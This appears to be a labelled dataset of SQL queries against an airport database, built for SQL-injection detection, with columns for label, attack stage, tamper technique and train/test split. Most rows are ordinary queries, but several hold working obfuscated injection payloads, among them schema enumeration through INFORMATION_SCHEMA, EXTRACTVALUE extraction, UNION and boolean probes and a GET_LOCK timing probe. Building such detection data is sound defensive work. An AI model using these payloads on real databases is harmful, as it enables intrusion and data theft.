DROP USER 'oracle'@'localhost';,0,,,,,admin,airport-admin14,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""MX-DIF""",0,AS MX-DIF,,,,select,airport-S8,,,test
"SELECT * FROM airport WHERE gps_code = ""CO13"" OR local_code = ""90OI""",0,CO13 90OI,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE type LIKE ""closed"" AND longitude >= -46.871387481689 AND name LIKE ""%lJHh4QNqAvLUAmf9XoBS%"" OR name LIKE ""%UzQwwCsrfutVjqJY7VEK%"" AND iso_region LIKE ""US-AR"" AND elevation_feet <= 7100.0 AND scheduled_service = ""no""",0,closed -46.871387481689 lJHh4QNqAvLUAmf9XoBS UzQwwCsrfutVjqJY7VEK US-AR 7100.0 no,,,,select,airport-S23,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Marsaxlokk"";",0,Marsaxlokk,,,,select,airport-S15,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""MRLG"";",0,MRLG,,,,select,airport-S7,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""KR-11""",0,EU KR-11,,,,select,airport-S8,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES ((sELEcT coNcaT(coNcaT(0x7178626a71,(sELEcT MiD((iFnulL(CAsT(TaBLe_NamE aS NchAr),0x20)),1,118) FRoM InFORMATION_SCHEMA.TAbleS WHere table_schema In (0x64617461736574) LiMiT 2,1)),0x7171766a71)), 3874, ""YMGO"", ""A/D"", ""WIEN RADAR"", 135.775)",1," (sELEcT coNcaT(coNcaT(0x7178626a71,(sELEcT MiD((iFnulL(CAsT(TaBLe_NamE aS NchAr ,0x20  ,1,118  FRoM InFORMATION_SCHEMA.TAbleS WHere table_schema In (0x64617461736574  LiMiT 2,1  ,0x7171766a71   3874 ""YMGO"" ""A/D"" ""WIEN RADAR"" 135.775 ",exploit,randomcase,success,insert,airport-I8,inline-47,inline,test
"SELECT * FROM airport WHERE gps_code = ""SNBC"" OR local_code = ""3NC6""",0,SNBC 3NC6,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CY"" GROUP BY r.name ORDER BY r.name ASC;",0,CY,,,,select,airport-S5,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CA""",0,CA,,,,select,airport-S9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""UNKY"";",0,UNKY,,,,select,airport-S7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Sultan Kudarat Province"";",0,Sultan Kudarat Province,,,,select,airport-S15,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Pista da Herdade do Pontal"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Cabinda Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Macao"", ""%"");",0,Pista da Herdade do Pontal Airports in Cabinda Province Macao,,,,select,airport-S18,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Oeste Plaza Shopping - MC Helipad""",0,Oeste Plaza Shopping - MC Helipad,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""UA""",0,UA,,,,select,airport-S9,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""DE"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,DE 3,,,,select,airport-S19,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Al Ghaydah International Airport""",0,Al Ghaydah International Airport,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (11300, ""MN16"", 7294.0, ""ASP"", 1, 0)",0,11300 MN16 7294.0 ASP 1 0,,,,insert,airport-I9,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""LFEX"", ""small_airport"", ""Holly Airport"", 38.81114, -76.60763, 667.0)",0,LFEX small_airport Holly Airport 38.81114 -76.60763 667.0,,,,insert,airport-I2,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 133.9 AND  122.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.625  AND  117.6  ORDER BY frequency;",0,133.9 122.8 118.625 117.6,,,,select,airport-S13,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""El Verano Airport"");",0,El Verano Airport,,,,select,airport-S12,,,train
"UPDATE airport SET name = ""Menggala Airport"" WHERE ident = ""VAAU""",0,Menggala Airport VAAU,,,,update,airport-U1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Cheshnegirovo Air Base"");",0,Cheshnegirovo Air Base,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MD"" GROUP BY r.name ORDER BY r.name ASC;",0,MD,,,,select,airport-S16,,,test
"DELETE FROM airport_frequencies WHERE type = ""CNTR"";",0,CNTR,,,,delete,airport-D4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4930"" AS SIGNED) AND a.iso_country = ""LV"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4930 LV,,,,select,airport-S22,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (94548, ""MRL'))) aNd MaKE_set(5456=5456,7667) aNd ((('wjuU'='wjuU"", ""Rangiroa"", ""NDB"", 205, ""KG"")",1," 94548 MRL'))) aNd MaKE_set(5456=5456,7667) aNd ((('wjuU'='wjuU"" Rangiroa"" NDB 205 KG ",recon,randomcase,failure,insert,airport-I10,boolean-54,boolean,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""BR""",0,BR,,,,select,airport-S9,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""RU"") OR a.elevation_ft > 960.0",0,RU 960.0,,,,select,airport-S11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DJ"" GROUP BY r.name ORDER BY r.name ASC;",0,DJ,,,,select,airport-S16,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Williamson County Regional Airport"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Xocavand District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Sahrawian, مطارات الصحراء الغربية"", ""%"");",0,"Williamson County Regional Airport Airports in Xocavand District Sahrawian, مطارات الصحراء الغربية",,,,select,airport-S18,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Lyubimets;""",0,Lyubimets,,,,select,airport-S21,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""CL-AI""",0,SA CL-AI,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PE"" GROUP BY r.name ORDER BY r.name ASC;",0,PE,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""US-MA""",0,AS US-MA,,,,select,airport-S8,,,test
"UPDATE countries SET keywords = ""Micronesian airports"" WHERE code = ""IN"";",0,Micronesian airports IN,,,,update,airport-U8,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Armada/Hoffler Business Center Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Armada/Hoffler Business Center Heliport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UA"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,UA 5,,,,select,airport-S19,,,test
"SELECT * FROM airport WHERE gps_code = ""KNUC"" OR local_code = ""OK49""",0,KNUC OK49,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE longitude >= 1.257531 AND type = ""heliport"" AND name LIKE ""%RBpR62QoZBBFcAXttXks%"" OR name LIKE ""%2W1OuuOV0nsR40Lvbdy7%"" AND latitude <= 32.02495 AND scheduled_service LIKE ""no""",0,1.257531 heliport RBpR62QoZBBFcAXttXks 2W1OuuOV0nsR40Lvbdy7 32.02495 no,,,,select,airport-S23,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Samaritan Hospital Heliport"");",0,Samaritan Hospital Heliport,,,,select,airport-S12,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-AR""",0,EU US-AR,,,,select,airport-S8,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""YDL"") OR name LIKE ""SSOU""",0,YDL SSOU,,,,select,airport-S10,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3347"" AS SIGNED) AND a.iso_country = ""PH"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3347 PH,,,,select,airport-S22,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""MV-05"", ""Central Governorate"", ""AS"", ""VE"", ""https://en.wikipedia.org/wiki/Nana-Mamb%C3%A9r%C3%A9"", ""Airports in Vila Real District"")",0,MV-05 Central Governorate AS VE https://en.wikipedia.org/wiki/Nana-Mamb%C3%A9r%C3%A9 Airports in Vila Real District,,,,insert,airport-I4,,,train
"SELECT id FROM airports WHERE ( FIND_IN_SET(""NdbDfybsoU23EoEqeAHq"", keywords_field) > 0 OR FIND_IN_SET(""whEY5EaaEqu556gzOjBv"", keywords_field) > 0) AND type IN (""heliport"",""heliport"",""heliport"") AND longitude <= 64.483299 AND elevation_feet <= 92.0 AND scheduled_service LIKE ""no"" AND name LIKE ""%ExqEWrvETMXMkNpDNx6N%"" OR name LIKE ""%Zr3RXwT5yLNdrGgGSxuT%""",0,NdbDfybsoU23EoEqeAHq whEY5EaaEqu556gzOjBv heliport heliport heliport 64.483299 92.0 no ExqEWrvETMXMkNpDNx6N Zr3RXwT5yLNdrGgGSxuT,,,,select,airport-S23,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (95024, ""YLT"", ""Beni Walid"", ""TACAN"", 112900, ""US"")",0,95024 YLT Beni Walid TACAN 112900 US,,,,insert,airport-I10,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""IT"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,IT 4,,,,select,airport-S19,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 10.0",0,US 10.0,,,,select,airport-S11,,,test
"UPDATE airport SET name = ""Orlando Heli-Tours Margaritaville Heliport"" WHERE ident = ""41LA""",0,Orlando Heli-Tours Margaritaville Heliport 41LA,,,,update,airport-U1,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""DM"" OR c.name LIKE CONCAT(""%"", ""Cambodia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,DM Cambodia 3,,,,select,airport-S20,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""LC"" OR c.name LIKE CONCAT(""%"", ""United Kingdom"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,LC United Kingdom 3,,,,select,airport-S20,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fazenda Pampa Alegre Airport"");",0,Fazenda Pampa Alegre Airport,,,,select,airport-S12,,,test
"UPDATE countries SET keywords = ""Swaziland"" WHERE code = ""SN"";",0,Swaziland SN,,,,update,airport-U8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(3179,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x616972706f7274/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/18,1),8,1))>96)/**/THEN/**/3179/**/ELSE/**/0x3A/**/END)/**/AND/**/""HrES""=""HrES"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(3179,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x616972706f7274/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/18,1),8,1))>96)/**/THEN/**/3179/**/ELSE/**/0x3A/**/END)/**/AND/**/""HrES""=""HrES Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""KN"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,KN 5,,,,select,airport-S19,,,test
"DELETE FROM airport_frequencies WHERE type = ""-5287""))/**/AS/**/ctuS/**/WHERE/**/1560=1560/**/OR/**/MAKE_SET(2916=4163,4163)--/**/fdlB"";",1," -5287""))/**/AS/**/ctuS/**/WHERE/**/1560=1560/**/OR/**/MAKE_SET(2916=4163,4163)--/**/fdlB ",recon,space2comment,success,delete,airport-D4,boolean-132,boolean,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 119.25 AND  122.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  120.7  AND  125.125  ORDER BY frequency;",0,119.25 122.5 120.7 125.125,,,,select,airport-S13,,,test
"DELETE FROM airport WHERE name = ""Glacier d'Argentière Altiport"";  ",0,Glacier d'Argentière Altiport,,,,delete,airport-D2,,,test
"DELETE FROM regions WHERE name = ""Ngeremlengui"";",0,Ngeremlengui,,,,delete,airport-D8,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""JP-0797"";",0,JP-0797,,,,select,airport-S7,,,test
SELECT * FROM airport WHERE icao_code = 'KWAY';,0,KWAY,,,,select,airport-S1,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AF"" GROUP BY r.name ORDER BY r.name ASC;",0,AF,,,,select,airport-S5,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 220.0 AND 700.0",0,220.0 700.0,,,,select,airport-S2,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Fábrica Fortaleza Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Fábrica Fortaleza Heliport,,,,select,airport-S14,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""JP-25""",0,EU JP-25,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MC"" GROUP BY r.name ORDER BY r.name ASC;",0,MC,,,,select,airport-S5,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Marla Airport"");",0,Marla Airport,,,,select,airport-S12,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""NG""",0,NG,,,,select,airport-S6,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Vuzenica"";",0,Vuzenica,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""AU-NT""",0,EU AU-NT,,,,select,airport-S8,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""DZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,DZ 4,,,,select,airport-S19,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""BG""",0,BG,,,,select,airport-S6,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""LA37"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Clark International Airport, South Ramp"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Centum Green Tower Apartments"", ""%"");",0,"LA37 Clark International Airport, South Ramp Centum Green Tower Apartments",,,,select,airport-S17,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 994.0 AND 2633.0",0,994.0 2633.0,,,,select,airport-S2,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""San Vicente, Santa Ana"") OR name LIKE ""4NJ9""",0,"San Vicente, Santa Ana 4NJ9",,,,select,airport-S10,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BF"", ""South Sudan"", ""AS"", ""South African airports"")",0,BF South Sudan AS South African airports,,,,insert,airport-I6,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Makati;""",0,Makati,,,,select,airport-S21,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Weston_Airport"" WHERE ident = ""US-9730""",0,https://en.wikipedia.org/wiki/Weston_Airport US-9730,,,,update,airport-U3,,,test
"SELECT * FROM airport WHERE gps_code = ""SNCI"" OR local_code = ""SHH""",0,SNCI SHH,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""كازرون, Kazeroon"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Chhukha"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""مطارات اليمن"", ""%"");",0,"كازرون, Kazeroon Airports in Chhukha مطارات اليمن",,,,select,airport-S18,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Pila"") OR name LIKE ""Seoul Centrol Post Office""",0,Pila Seoul Centrol Post Office,,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BH"" OR c.name LIKE CONCAT(""%"", ""Czech Republic"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,BH Czech Republic 5,,,,select,airport-S20,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""BT-43"", ""County Dublin"", ""AS"", ""BS"", ""https://en.wikipedia.org/wiki/Salt_Cay_"", ""Airports in Bryansk Oblast"")",0,BT-43 County Dublin AS BS https://en.wikipedia.org/wiki/Salt_Cay_ Airports in Bryansk Oblast,,,,insert,airport-I4,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""AR""",0,AR,,,,select,airport-S6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LT"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,LT 2,,,,select,airport-S19,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4235"" AS SIGNED) AND a.iso_country = ""CR"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4235 CR,,,,select,airport-S22,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,UZ 2,,,,select,airport-S19,,,test
"UPDATE navaids SET name = ""Russky Kameshkir"" WHERE ident = ""PHK"";",0,Russky Kameshkir PHK,,,,update,airport-U7,,,test
"INSERT INTO countries (code, name, continent) VALUES (""ME"", ""Cambodia"", ""EU"")",0,ME Cambodia EU,,,,insert,airport-I7,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (26904, ""33VA"", 3898.0, ""N"", 0, 0)",0,26904 33VA 3898.0 N 0 0,,,,insert,airport-I9,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Ansbach Katterbach Army Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Ansbach Katterbach Army Heliport,,,,select,airport-S14,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (11122, ""SSYD"", 50.0, ""-5113 unIOn aLl SelECT 2406,2406#"", 1, 0)",1," 11122 SSYD 50.0 -5113 unIOn aLl SelECT 2406,2406# 1 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"DELETE FROM navaids WHERE ident = ""M"";",0,M,,,,delete,airport-D6,,,test
"SELECT * FROM airport WHERE gps_code = ""SLZV"" OR local_code = ""3WA7""",0,SLZV 3WA7,,,,select,airport-S4,,,test
"DELETE FROM airport WHERE name LIKE ""Güinolosa Airport"" OR keywords LIKE ""FW2"";  ",0,Güinolosa Airport FW2,,,,delete,airport-D3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Newry Airfield"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Newry Airfield,,,,select,airport-S14,,,test
"DELETE FROM navaids WHERE ident = ""-5230'))	OR�MAKE_SET(9044=6623,6623)AND	(('YuWa'='YuWa"";",1," -5230'))	OR�MAKE_SET(9044=6623,6623)AND	(('YuWa'='YuWa ",recon,space2mysqlblank,failure,delete,airport-D6,boolean-138,boolean,test
"SELECT id FROM airports WHERE type = ""small_airport"" AND iso_region = ""BW-GH"" AND name LIKE ""%jDpgmadZFxZmy7yiJYte%"" OR name LIKE ""%mIo3OpqbZRwjv5tFld1L%""",0,small_airport BW-GH jDpgmadZFxZmy7yiJYte mIo3OpqbZRwjv5tFld1L,,,,select,airport-S23,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Chersky Airport, Аэропорт Черский"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Providenciales"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Letiště České republiky, Czechia"", ""%"");",0,"Chersky Airport, Аэропорт Черский Airports in Providenciales Letiště České republiky, Czechia",,,,select,airport-S18,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 2648.0",0,US 2648.0,,,,select,airport-S11,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Enngonia""",0,Enngonia,,,,select,airport-S3,,,test
"UPDATE airport SET municipality = ""Deming"" WHERE iso_country = ""US""",0,Deming US,,,,update,airport-U2,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BT"" OR c.name LIKE CONCAT(""%"", ""Palau"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,BT Palau 4,,,,select,airport-S20,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SSBE"") OR name LIKE ""SIKU""",0,SSBE SIKU,,,,select,airport-S10,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""MX')) AS eHdE WHERE 9240=9240 AND GET_LOCK('FIoq',5)-- MVnz""",1," MX')) AS eHdE WHERE 9240=9240 AND GET_LOCK('FIoq',5)-- MVnz ",recon,sleep2getlock,failure,select,airport-S6,time-190,time,test
